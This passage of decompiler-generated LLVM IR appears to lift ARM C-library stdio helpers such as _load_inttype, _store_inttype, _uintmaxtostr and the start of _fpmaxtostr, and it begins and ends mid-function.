  store i1 %v4_1405c, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* @r4, align 4
  br i1 %v4_1405c, label %dec_label_pc_14068, label %dec_label_pc_14080

dec_label_pc_14068:                               ; preds = %entry
  %v1_14068 = and i32 %v5_14058, 2176
  %v2_14068 = icmp eq i32 %v1_14068, 0
  store i1 %v2_14068, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14068, label %dec_label_pc_14070, label %dec_label_pc_14094

dec_label_pc_14070:                               ; preds = %dec_label_pc_14068
  %v2_14070 = or i32 %v5_14058, %arg2
  store i32 %v2_14070, i32* %r2.global-to-local, align 4
  %v3_14074 = sdiv i32 %v2_14070, 256
  store i32 %v3_14074, i32* %r3.global-to-local, align 4
  %v1_14078 = trunc i32 %v3_14074 to i8
  store i8 %v1_14078, i8* %v3_14054, align 1
  %v0_1407c = load i32, i32* %r2.global-to-local, align 4
  %v1_1407c = trunc i32 %v0_1407c to i8
  store i8 %v1_1407c, i8* %arg1, align 1
  %v0_14080.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14080

dec_label_pc_14080:                               ; preds = %entry, %dec_label_pc_14070
  %v0_140cc = phi i32 [ %tmp, %entry ], [ %v0_14080.pre, %dec_label_pc_14070 ]
  %v1_14080 = inttoptr i32 %v0_140cc to i8*
  %v2_14080 = load i8, i8* %v1_14080, align 1
  %v3_14080 = zext i8 %v2_14080 to i32
  store i32 %v3_14080, i32* %r2.global-to-local, align 4
  %v1_14084 = add i32 %v0_140cc, 1
  %v2_14084 = inttoptr i32 %v1_14084 to i8*
  %v3_14084 = load i8, i8* %v2_14084, align 1
  %v4_14084 = zext i8 %v3_14084 to i32
  store i32 %v4_14084, i32* %r3.global-to-local, align 4
  %v4_14088 = mul nuw nsw i32 %v4_14084, 256
  %v5_14088 = or i32 %v4_14088, %v3_14080
  store i32 %v5_14088, i32* @ip, align 4
  %v1_1408c = and i32 %v3_14080, 32
  %v2_1408c = icmp eq i32 %v1_1408c, 0
  store i1 %v2_1408c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1408c, label %dec_label_pc_140bc, label %dec_label_pc_14094

dec_label_pc_14094:                               ; preds = %dec_label_pc_14068, %dec_label_pc_14080
  %v0_14094 = call i32 @__errno_location()
  store i32 %v0_14094, i32* %r0.global-to-local, align 4
  store i32 9, i32* %r3.global-to-local, align 4
  %v2_1409c = inttoptr i32 %v0_14094 to i32*
  store i32 9, i32* %v2_1409c, align 4
  br label %dec_label_pc_140a0

dec_label_pc_140a0:                               ; preds = %dec_label_pc_140e4, %dec_label_pc_14094
  %v0_140a0 = load i32, i32* @r4, align 4
  %v1_140a0 = inttoptr i32 %v0_140a0 to i32*
  %v2_140a0 = load i32, i32* %v1_140a0, align 4
  %v1_140a4 = or i32 %v2_140a0, 8
  store i32 %v1_140a4, i32* %r3.global-to-local, align 4
  %v3_140a8 = sdiv i32 %v2_140a0, 256
  store i32 %v3_140a8, i32* %r2.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_140b0 = trunc i32 %v3_140a8 to i8
  %v3_140b0 = add i32 %v0_140a0, 1
  %v4_140b0 = inttoptr i32 %v3_140b0 to i8*
  store i8 %v1_140b0, i8* %v4_140b0, align 1
  %v0_140b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_140b4 = trunc i32 %v0_140b4 to i8
  %v2_140b4 = load i32, i32* @r4, align 4
  %v3_140b4 = inttoptr i32 %v2_140b4 to i8*
  store i8 %v1_140b4, i8* %v3_140b4, align 1
  %v2_140b8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_140b8, i32* @r4, align 4
  ret i32 -1

dec_label_pc_140bc:                               ; preds = %dec_label_pc_14080
  %tmp15 = urem i8 %v2_14080, 4
  %v2_140bc = icmp eq i8 %tmp15, 0
  store i1 %v2_140bc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140bc, label %dec_label_pc_14120, label %dec_label_pc_140c4

dec_label_pc_140c4:                               ; preds = %dec_label_pc_140bc
  %v1_140c4 = and i32 %v3_14080, 4
  store i32 %v1_140c4, i32* @r1, align 4
  %v2_140c4 = icmp eq i32 %v1_140c4, 0
  store i1 %v2_140c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140c4, label %dec_label_pc_140cc, label %dec_label_pc_140fc

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140c4
  %v1_140cc = add i32 %v0_140cc, 20
  %v2_140cc = inttoptr i32 %v1_140cc to i32*
  %v3_140cc = load i32, i32* %v2_140cc, align 4
  store i32 %v3_140cc, i32* %r2.global-to-local, align 4
  %v1_140d0 = add i32 %v0_140cc, 16
  %v2_140d0 = inttoptr i32 %v1_140d0 to i32*
  %v3_140d0 = load i32, i32* %v2_140d0, align 4
  store i32 %v3_140d0, i32* %r3.global-to-local, align 4
  %v9_140d4 = icmp eq i32 %v3_140cc, %v3_140d0
  store i1 %v9_140d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_140d4, label %dec_label_pc_140dc, label %dec_label_pc_140e4

dec_label_pc_140dc:                               ; preds = %dec_label_pc_140cc
  %v1_140dc = and i32 %v3_14080, 2
  %v2_140dc = icmp eq i32 %v1_140dc, 0
  store i1 %v2_140dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140dc, label %dec_label_pc_140fc, label %dec_label_pc_140e4

dec_label_pc_140e4:                               ; preds = %dec_label_pc_140cc, %dec_label_pc_140dc
  %v1_140e4 = and i32 %v4_14088, 1024
  %v2_140e4 = icmp eq i32 %v1_140e4, 0
  store i1 %v2_140e4, i1* %cpsr_z.global-to-local, align 1
  %tmp13 = udiv i32 %v1_140e4, 1024
  %tmp14 = add nuw nsw i32 %tmp13, 1
  store i32 %tmp14, i32* @r2, align 4
  %v0_140f0 = call i32 @__GI_fseek()
  store i32 %v0_140f0, i32* %r0.global-to-local, align 4
  %v2_140f4 = icmp eq i32 %v0_140f0, 0
  store i1 %v2_140f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140f4, label %.dec_label_pc_140fc_crit_edge, label %dec_label_pc_140a0

.dec_label_pc_140fc_crit_edge:                    ; preds = %dec_label_pc_140e4
  %v0_140fc.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_140fc

dec_label_pc_140fc:                               ; preds = %.dec_label_pc_140fc_crit_edge, %dec_label_pc_140c4, %dec_label_pc_140dc
  %v2_1410c = phi i32 [ %v0_140fc.pre, %.dec_label_pc_140fc_crit_edge ], [ %v0_140cc, %dec_label_pc_140c4 ], [ %v0_140cc, %dec_label_pc_140dc ]
  %v1_140fc = inttoptr i32 %v2_1410c to i32*
  %v2_140fc = load i32, i32* %v1_140fc, align 4
  store i32 %v2_140fc, i32* %r3.global-to-local, align 4
  %v1_14100 = add i32 %v2_1410c, 8
  %v2_14100 = inttoptr i32 %v1_14100 to i32*
  %v3_14100 = load i32, i32* %v2_14100, align 4
  store i32 %v3_14100, i32* %r1.global-to-local, align 4
  %v1_14104 = and i32 %v2_140fc, -4
  store i32 %v1_14104, i32* %r3.global-to-local, align 4
  %v3_14108 = sdiv i32 %v2_140fc, 256
  store i32 %v3_14108, i32* %r2.global-to-local, align 4
  %v1_1410c = trunc i32 %v3_14108 to i8
  %v3_1410c = add i32 %v2_1410c, 1
  %v4_1410c = inttoptr i32 %v3_1410c to i8*
  store i8 %v1_1410c, i8* %v4_1410c, align 1
  %v0_14110 = load i32, i32* %r1.global-to-local, align 4
  %v1_14110 = load i32, i32* @r4, align 4
  %v2_14110 = add i32 %v1_14110, 20
  %v3_14110 = inttoptr i32 %v2_14110 to i32*
  store i32 %v0_14110, i32* %v3_14110, align 4
  %v0_14114 = load i32, i32* %r3.global-to-local, align 4
  %v1_14114 = trunc i32 %v0_14114 to i8
  %v2_14114 = load i32, i32* @r4, align 4
  %v3_14114 = inttoptr i32 %v2_14114 to i8*
  store i8 %v1_14114, i8* %v3_14114, align 1
  %v0_14118 = load i32, i32* %r1.global-to-local, align 4
  %v1_14118 = load i32, i32* @r4, align 4
  %v2_14118 = add i32 %v1_14118, 24
  %v3_14118 = inttoptr i32 %v2_14118 to i32*
  store i32 %v0_14118, i32* %v3_14118, align 4
  %v0_1411c = load i32, i32* %r1.global-to-local, align 4
  %v1_1411c = load i32, i32* @r4, align 4
  %v2_1411c = add i32 %v1_1411c, 16
  %v3_1411c = inttoptr i32 %v2_1411c to i32*
  store i32 %v0_1411c, i32* %v3_1411c, align 4
  %v0_14120.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_14120

dec_label_pc_14120:                               ; preds = %dec_label_pc_140bc, %dec_label_pc_140fc
  %v2_1412c = phi i32 [ %v0_140cc, %dec_label_pc_140bc ], [ %v0_14120.pre, %dec_label_pc_140fc ]
  %v1_14120 = inttoptr i32 %v2_1412c to i32*
  %v2_14120 = load i32, i32* %v1_14120, align 4
  %v1_14124 = or i32 %v2_14120, 64
  store i32 %v1_14124, i32* %r2.global-to-local, align 4
  %v3_14128 = sdiv i32 %v2_14120, 256
  store i32 %v3_14128, i32* %r3.global-to-local, align 4
  %v1_1412c = trunc i32 %v3_14128 to i8
  %v3_1412c = add i32 %v2_1412c, 1
  %v4_1412c = inttoptr i32 %v3_1412c to i8*
  store i8 %v1_1412c, i8* %v4_1412c, align 1
  %v0_14130 = load i32, i32* @r4, align 4
  %v1_14130 = add i32 %v0_14130, 1
  %v2_14130 = inttoptr i32 %v1_14130 to i8*
  %v3_14130 = load i8, i8* %v2_14130, align 1
  %v4_14130 = zext i8 %v3_14130 to i32
  %v3_14134 = mul nuw nsw i32 %v4_14130, 256
  store i32 %v3_14134, i32* %r3.global-to-local, align 4
  %v1_14138 = and i32 %v3_14134, 2816
  store i32 %v1_14138, i32* %r0.global-to-local, align 4
  %v2_14138 = icmp eq i32 %v1_14138, 0
  store i1 %v2_14138, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14138, label %bb9, label %.thread1

bb9:                                              ; preds = %dec_label_pc_14120
  %v2_1413c = add i32 %v0_14130, 12
  %v3_1413c = inttoptr i32 %v2_1413c to i32*
  %v4_1413c = load i32, i32* %v3_1413c, align 4
  store i32 %v4_1413c, i32* %r3.global-to-local, align 4
  br label %bb10

.thread1:                                         ; preds = %dec_label_pc_14120
  store i32 0, i32* %r0.global-to-local, align 4
  br label %bb10

bb10:                                             ; preds = %bb9, %.thread1
  %v0_14144 = load i32, i32* %r2.global-to-local, align 4
  %v1_14144 = trunc i32 %v0_14144 to i8
  %v3_14144 = inttoptr i32 %v0_14130 to i8*
  store i8 %v1_14144, i8* %v3_14144, align 1
  %v0_14148 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14148, label %bb11, label %bb12

bb11:                                             ; preds = %bb10
  %v1_14148 = load i32, i32* %r3.global-to-local, align 4
  %v2_14148 = load i32, i32* @r4, align 4
  %v3_14148 = add i32 %v2_14148, 28
  %v4_14148 = inttoptr i32 %v3_14148 to i32*
  store i32 %v1_14148, i32* %v4_14148, align 4
  br label %bb12

bb12:                                             ; preds = %bb10, %bb11
  %v2_1414c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1414c, i32* @r4, align 4
  %v8_1414c = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v8_1414c

; uselistorder directives
  uselistorder i32 %v3_14134, { 1, 0 }
  uselistorder i32 %v3_14128, { 1, 0 }
  uselistorder i32 %v3_14108, { 1, 0 }
  uselistorder i32 %v2_1410c, { 0, 2, 1 }
  uselistorder i1 %v2_140bc, { 1, 0 }
  uselistorder i32 %v3_140a8, { 1, 0 }
  uselistorder i32 %v3_14080, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_140cc, { 0, 1, 2, 4, 3, 6, 5 }
  uselistorder i32 %v3_14074, { 1, 0 }
  uselistorder i32 %v5_14058, { 0, 2, 1, 3 }
  uselistorder i32* %r3.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 1024, { 0, 13, 14, 2, 15, 1, 16, 17, 18, 4, 11, 12, 3, 7, 8, 6, 9, 5, 10, 19 }
  uselistorder label %bb12, { 1, 0 }
  uselistorder label %bb10, { 1, 0 }
  uselistorder label %dec_label_pc_14120, { 1, 0 }
  uselistorder label %dec_label_pc_140fc, { 0, 2, 1 }
  uselistorder label %dec_label_pc_140e4, { 1, 0 }
  uselistorder label %dec_label_pc_14094, { 1, 0 }
  uselistorder label %dec_label_pc_14080, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %v0_14150 = load i32, i32* @r2, align 4
  %v1_14150 = icmp slt i32 %v0_14150, 0
  %v0_14154 = load i32, i32* @r0, align 4
  %v1_14158 = and i32 %v0_14154, 2048
  %v2_1418c = icmp eq i32 %v1_14158, 0
  br i1 %v1_14150, label %dec_label_pc_1418c, label %dec_label_pc_14160

dec_label_pc_14160:                               ; preds = %entry
  br i1 %v2_1418c, label %dec_label_pc_14168, label %dec_label_pc_14194

dec_label_pc_14168:                               ; preds = %dec_label_pc_14160
  %v7_14168 = icmp eq i32 %v0_14154, 256
  %v0_1416c = load i32, i32* @r1, align 4
  %v1_1416c = inttoptr i32 %v0_1416c to i32*
  %v2_1416c = load i32, i32* %v1_1416c, align 4
  %v2_14170 = urem i32 %v2_1416c, 256
  %v2_14170.v2_1416c = select i1 %v7_14168, i32 %v2_14170, i32 %v2_1416c
  br i1 %v7_14168, label %.thread, label %dec_label_pc_14178

dec_label_pc_14178:                               ; preds = %dec_label_pc_14168
  %v7_14178 = icmp eq i32 %v0_14154, 512
  br i1 %v7_14178, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14178
  %v4_14180 = urem i32 %v2_14170.v2_1416c, 65536
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14178, %dec_label_pc_14168, %bb
  %v1_14188 = phi i32 [ %v2_1416c, %dec_label_pc_14178 ], [ %v2_14170, %dec_label_pc_14168 ], [ %v4_14180, %bb ]
  store i32 0, i32* @r1, align 4
  ret i32 %v1_14188

dec_label_pc_1418c:                               ; preds = %entry
  br i1 %v2_1418c, label %dec_label_pc_1419c, label %dec_label_pc_14194

dec_label_pc_14194:                               ; preds = %dec_label_pc_14160, %dec_label_pc_1418c
  %v0_14194 = load i32, i32* @r1, align 4
  %v1_14194 = inttoptr i32 %v0_14194 to i32*
  %v2_14194 = load i32, i32* %v1_14194, align 4
  %v3_14194 = add i32 %v0_14194, 4
  %v4_14194 = inttoptr i32 %v3_14194 to i32*
  %v5_14194 = load i32, i32* %v4_14194, align 4
  store i32 %v5_14194, i32* @r1, align 4
  ret i32 %v2_14194

dec_label_pc_1419c:                               ; preds = %dec_label_pc_1418c
  %v7_1419c = icmp eq i32 %v0_14154, 256
  %v0_141a0 = load i32, i32* @r1, align 4
  %v1_141a0 = inttoptr i32 %v0_141a0 to i32*
  %v2_141a0 = load i32, i32* %v1_141a0, align 4
  %v2_141a4 = urem i32 %v2_141a0, 256
  %v2_141a4.v2_141a0 = select i1 %v7_1419c, i32 %v2_141a4, i32 %v2_141a0
  br i1 %v7_1419c, label %.thread2, label %dec_label_pc_141ac

dec_label_pc_141ac:                               ; preds = %dec_label_pc_1419c
  %v7_141ac = icmp eq i32 %v0_14154, 512
  br i1 %v7_141ac, label %bb5, label %.thread2

bb5:                                              ; preds = %dec_label_pc_141ac
  %v4_141b0 = mul i32 %v2_141a4.v2_141a0, 65536
  %v4_141b4 = sdiv i32 %v4_141b0, 65536
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_141ac, %dec_label_pc_1419c, %bb5
  %v0_141b8 = phi i32 [ %v2_141a0, %dec_label_pc_141ac ], [ %v2_141a4, %dec_label_pc_1419c ], [ %v4_141b4, %bb5 ]
  %v3_141b8 = ashr i32 %v0_141b8, 31
  store i32 %v3_141b8, i32* @r1, align 4
  ret i32 %v0_141b8

; uselistorder directives
  uselistorder i32 %v0_141b8, { 1, 0 }
  uselistorder i32 %v2_141a4, { 1, 0 }
  uselistorder i32 %v2_141a0, { 1, 2, 0 }
  uselistorder i32 %v2_14170, { 1, 0 }
  uselistorder i32 %v2_1416c, { 1, 2, 0 }
  uselistorder i1 %v2_1418c, { 1, 0 }
  uselistorder label %.thread2, { 2, 0, 1 }
  uselistorder label %dec_label_pc_14194, { 1, 0 }
  uselistorder label %.thread, { 2, 0, 1 }
}

define i32 @_store_inttype(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %tmp = trunc i32 %arg3 to i8
  %tmp2 = ptrtoint i8* %arg1 to i32
  %v7_141c0 = icmp eq i32 %arg2, 256
  br i1 %v7_141c0, label %dec_label_pc_141ec, label %dec_label_pc_141c8

dec_label_pc_141c8:                               ; preds = %entry
  %v7_141c8 = icmp eq i32 %arg2, 2048
  br i1 %v7_141c8, label %dec_label_pc_141d0, label %dec_label_pc_141d8

dec_label_pc_141d0:                               ; preds = %dec_label_pc_141c8
  %tmp3 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp3, align 4
  %v5_141d0 = add i32 %tmp2, 4
  %v6_141d0 = inttoptr i32 %v5_141d0 to i32*
  store i32 %arg4, i32* %v6_141d0, align 4
  ret i32 %tmp2

dec_label_pc_141d8:                               ; preds = %dec_label_pc_141c8
  %v7_141d8 = icmp eq i32 %arg2, 512
  %v4_141dc = sdiv i32 %arg3, 256
  store i32 %v4_141dc, i32* @ip, align 4
  br i1 %v7_141d8, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_141d8
  %tmp4 = bitcast i8* %arg1 to i32*
  store i32 %arg3, i32* %tmp4, align 4
  ret i32 %tmp2

.thread:                                          ; preds = %dec_label_pc_141d8
  %v1_141e8 = trunc i32 %v4_141dc to i8
  %v4_141e8 = add i32 %tmp2, 1
  %v5_141e8 = inttoptr i32 %v4_141e8 to i8*
  store i8 %v1_141e8, i8* %v5_141e8, align 1
  br label %dec_label_pc_141ec

dec_label_pc_141ec:                               ; preds = %entry, %.thread
  store i8 %tmp, i8* %arg1, align 1
  ret i32 %tmp2

; uselistorder directives
  uselistorder i32 %v4_141dc, { 1, 0 }
  uselistorder i32 %tmp2, { 4, 1, 0, 2, 3 }
  uselistorder i32 %arg3, { 1, 0, 2, 3 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder i8* %arg1, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_141ec, { 1, 0 }
}

define i32 @_uintmaxtostr(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-40 = alloca i8, align 1
  store i32 %arg4, i32* %r7.global-to-local, align 4
  %v1_141f8 = icmp slt i32 %arg4, 0
  %v2_141f8 = icmp eq i32 %arg4, 0
  store i1 %v2_141f8, i1* %cpsr_z.global-to-local, align 1
  store i32 %tmp, i32* %r8.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg3, i32* %r6.global-to-local, align 4
  br i1 %v1_141f8, label %dec_label_pc_14210, label %dec_label_pc_14230

dec_label_pc_14210:                               ; preds = %entry
  %v1_14210 = icmp slt i32 %arg3, 0
  %v2_14210 = icmp eq i32 %arg3, 0
  store i1 %v2_14210, i1* %cpsr_z.global-to-local, align 1
  %v1_14214 = sub i32 0, %arg4
  store i32 %v1_14214, i32* %r7.global-to-local, align 4
  br i1 %v1_14210, label %dec_label_pc_1421c, label %dec_label_pc_14230

dec_label_pc_1421c:                               ; preds = %dec_label_pc_14210
  %v1_14220 = sub i32 0, %arg2
  store i32 %v1_14220, i32* %r5.global-to-local, align 4
  %v2_14220 = icmp eq i32 %arg2, 0
  %v2_14224 = icmp eq i1 %v2_14220, false
  %v5_14224 = sext i1 %v2_14224 to i32
  %v6_14224 = sub i32 %v5_14224, %arg3
  store i32 %v6_14224, i32* %r6.global-to-local, align 4
  %v19_14224 = icmp eq i32 %v6_14224, 0
  store i1 %v19_14224, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_14238

dec_label_pc_14230:                               ; preds = %dec_label_pc_14210, %entry
  br label %dec_label_pc_14238

dec_label_pc_14238:                               ; preds = %dec_label_pc_1421c, %dec_label_pc_14230
  %storemerge = phi i8 [ 0, %dec_label_pc_14230 ], [ 1, %dec_label_pc_1421c ]
  store i8 %storemerge, i8* %stack_var_-40, align 1
  store i32 0, i32* %sl.global-to-local, align 4
  store i8 0, i8* %arg1, align 1
  %v0_14240 = load i32, i32* %r7.global-to-local, align 4
  %v2_14248 = udiv i32 -1, %v0_14240
  store i32 %v2_14248, i32* %fp.global-to-local, align 4
  %v2_14258 = urem i32 -1, %v0_14240
  %v1_1425c = add i32 %v2_14258, 1
  store i32 %v1_1425c, i32* %sb.global-to-local, align 4
  %v9_14260 = icmp eq i32 %v1_1425c, %v0_14240
  store i1 %v9_14260, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14260, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_14238
  %v1_14264 = load i32, i32* %sl.global-to-local, align 4
  store i32 %v1_14264, i32* %sb.global-to-local, align 4
  %v2_14268 = add i32 %v2_14248, 1
  store i32 %v2_14268, i32* %fp.global-to-local, align 4
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_14238, %bb
  %v0_1426c = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1426c, i32* %sl.global-to-local, align 4
  %v0_14270 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_14270, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_14274

dec_label_pc_14274thread-pre-split:               ; preds = %bb21
  %v0_14274.pr = load i32, i32* %sl.global-to-local, align 4
  %v0_1427c.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_14274

dec_label_pc_14274:                               ; preds = %dec_label_pc_14274thread-pre-split, %.thread
  %v0_142e4 = phi i32 [ %v0_1427c.pre, %dec_label_pc_14274thread-pre-split ], [ %v0_14240, %.thread ]
  %v0_14290 = phi i32 [ %v0_14274.pr, %dec_label_pc_14274thread-pre-split ], [ %v0_1426c, %.thread ]
  %v2_14274 = icmp eq i32 %v0_14290, 0
  store i1 %v2_14274, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14274, label %dec_label_pc_142e0, label %dec_label_pc_14284

dec_label_pc_14284:                               ; preds = %dec_label_pc_14274
  %v2_14284 = urem i32 %v0_14290, %v0_142e4
  %v2_14294 = udiv i32 %v0_14290, %v0_142e4
  store i32 %v2_14294, i32* %sl.global-to-local, align 4
  %v0_142a0 = load i32, i32* %r6.global-to-local, align 4
  %v2_142a4 = urem i32 %v0_142a0, %v0_142e4
  %v1_142ac = load i32, i32* %sb.global-to-local, align 4
  %v3_142ac = mul i32 %v1_142ac, %v2_14284
  %v4_142ac = add i32 %v3_142ac, %v2_142a4
  store i32 %v4_142ac, i32* %r5.global-to-local, align 4
  %v2_142b4 = udiv i32 %v0_142a0, %v0_142e4
  %v0_142bc = load i32, i32* %fp.global-to-local, align 4
  %v3_142bc = mul i32 %v0_142bc, %v2_14284
  %v4_142bc = add i32 %v3_142bc, %v2_142b4
  %v2_142c4 = udiv i32 %v4_142ac, %v0_142e4
  %v2_142cc = add i32 %v4_142bc, %v2_142c4
  br label %dec_label_pc_14300

dec_label_pc_142e0:                               ; preds = %dec_label_pc_14274
  %v0_142e0 = load i32, i32* %r6.global-to-local, align 4
  %v2_142f8 = udiv i32 %v0_142e0, %v0_142e4
  br label %dec_label_pc_14300

dec_label_pc_14300:                               ; preds = %dec_label_pc_14284, %dec_label_pc_142e0
  %storemerge24 = phi i32 [ %v2_142f8, %dec_label_pc_142e0 ], [ %v2_142cc, %dec_label_pc_14284 ]
  %v0_1431c = phi i32 [ %v2_142f8, %dec_label_pc_142e0 ], [ %v2_142cc, %dec_label_pc_14284 ]
  %v1_1431c = phi i32 [ 0, %dec_label_pc_142e0 ], [ %v2_14294, %dec_label_pc_14284 ]
  %v4_142ac.pn = phi i32 [ %v0_142e0, %dec_label_pc_142e0 ], [ %v4_142ac, %dec_label_pc_14284 ]
  store i32 %storemerge24, i32* %r6.global-to-local, align 4
  %v0_14308 = urem i32 %v4_142ac.pn, %v0_142e4
  %v3_14300 = load i32, i32* %stack_var_0, align 4
  %v2_14304 = icmp ugt i32 %v0_14308, 8
  %v7_14304 = icmp eq i32 %v0_14308, 9
  store i1 %v7_14304, i1* %cpsr_z.global-to-local, align 1
  %v1_1430c = add i32 %v0_14308, 48
  %v0_14314 = load i32, i32* %r8.global-to-local, align 4
  %v1_14314 = add i32 %v0_14314, -1
  store i32 %v1_14314, i32* %r8.global-to-local, align 4
  %v2_14318 = xor i1 %v7_14304, true
  %v3_14318 = and i1 %v2_14304, %v2_14318
  %extract.t = trunc i32 %v1_1430c to i8
  br i1 %v3_14318, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_14300
  %v2_14308 = add i32 %v3_14300, %v0_14308
  %extract.t8 = trunc i32 %v2_14308 to i8
  br label %bb21

bb21:                                             ; preds = %dec_label_pc_14300, %bb20
  %v0_14320.off0 = phi i8 [ %extract.t, %dec_label_pc_14300 ], [ %extract.t8, %bb20 ]
  %v2_1431c = or i32 %v0_1431c, %v1_1431c
  %v4_1431c = icmp eq i32 %v2_1431c, 0
  store i1 %v4_1431c, i1* %cpsr_z.global-to-local, align 1
  %v3_14320 = inttoptr i32 %v1_14314 to i8*
  store i8 %v0_14320.off0, i8* %v3_14320, align 1
  %v0_14324 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14324, label %dec_label_pc_14328, label %dec_label_pc_14274thread-pre-split

dec_label_pc_14328:                               ; preds = %bb21
  %v2_14328 = load i8, i8* %stack_var_-40, align 1
  %v2_1432c = icmp eq i8 %v2_14328, 0
  store i1 %v2_1432c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1432c, label %dec_label_pc_14328..thread2_crit_edge, label %bb22

dec_label_pc_14328..thread2_crit_edge:            ; preds = %dec_label_pc_14328
  %v0_14338.pre = load i32, i32* %r8.global-to-local, align 4
  br label %.thread2

bb22:                                             ; preds = %dec_label_pc_14328
  %v3_14334 = load i32, i32* %r8.global-to-local, align 4
  %v4_14334 = add i32 %v3_14334, -1
  %v5_14334 = inttoptr i32 %v4_14334 to i8*
  store i8 45, i8* %v5_14334, align 1
  %v6_14334 = load i32, i32* %r8.global-to-local, align 4
  %v7_14334 = add i32 %v6_14334, -1
  store i32 %v7_14334, i32* %r8.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14328..thread2_crit_edge, %bb22
  %v0_14338 = phi i32 [ %v0_14338.pre, %dec_label_pc_14328..thread2_crit_edge ], [ %v7_14334, %bb22 ]
  ret i32 %v0_14338

; uselistorder directives
  uselistorder i32 %v0_14308, { 3, 2, 1, 0 }
  uselistorder i32 %v0_142e4, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i8* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_0, { 1, 0 }
  uselistorder i32* %sb.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r8.global-to-local, { 0, 2, 3, 1, 4, 5, 6 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 0, 2, 1, 3, 5, 4, 6 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %fp.global-to-local, { 1, 0, 2 }
  uselistorder i8 45, { 1, 0, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %bb21, { 1, 0 }
  uselistorder label %dec_label_pc_14300, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_14238, { 1, 0 }
}

define i32 @_fpmaxtostr(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %cpsr_n.global-to-local = alloca i1, align 1
  %cpsr_v.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp151 = call i8 @__decompiler_undefined_function_2()
  %stack_var_-50 = alloca i8, align 1
